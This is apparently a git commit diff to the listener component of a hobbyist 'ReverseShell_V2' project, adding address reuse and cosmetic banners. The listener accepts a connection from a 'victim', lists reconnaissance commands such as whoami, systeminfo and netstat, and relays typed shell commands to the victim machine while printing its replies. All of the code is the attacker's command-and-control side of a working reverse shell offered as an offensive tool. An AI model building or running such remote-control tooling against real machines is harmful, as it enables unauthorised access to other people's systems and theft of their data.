03f0097090fb59b00caead9af0668150fbf790dd
Aryan <103557267+Aryan-notEthical@users.noreply.github.com>
2024-01-01 15:13:04 +0530

    Updated Listener.py

--- ReverseShell_V2/Listener.py
+++ ReverseShell_V2/Listener.py
@@ -1,15 +1,17 @@
-#Author aryan_not_ethical(instagram)
+#Author aryan_not_ethical(instagram & discord)
 #This is version 2 of my reverse shell
 '''
 -Better interface
 -All commands displayed
 -Better handling
+-Reuse Address 
 '''
 import socket
 
 IP = "127.0.0.1"
 PORT = 50000
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 server.bind((IP, PORT))
 server.listen(10)
 
@@ -23,22 +25,26 @@ commands = '''
     dir , ipconfig , whoami , systeminfo , driverquery , hostname , netstat
     
 '''
-print("Listening for connections....")
+print("|------------------------------------------------------------------------------------------------|") 
+print("|                                 ....Listening for connections....                              |")
+print("|------------------------------------------------------------------------------------------------|") 
 while True:
     try:
         victim, addr = server.accept()
         print(f"[+] Victem Connected!!")
         print(commands)
+        print("------------------------------------------------------------------------------------------------") 
         while True:
             cmd = input("Shell: ")
             victim.send(bytes(cmd, "utf-8"))
             msg = victim.recv(16384).decode("utf-8")   
-            print("-----------------------------------------------")         
+            print("------------------------------------------------------------------------------------------------")         
             print(msg)
             
     
     except Exception as e:
             print(f"[!] Error: {e}")
+            
             
             
 
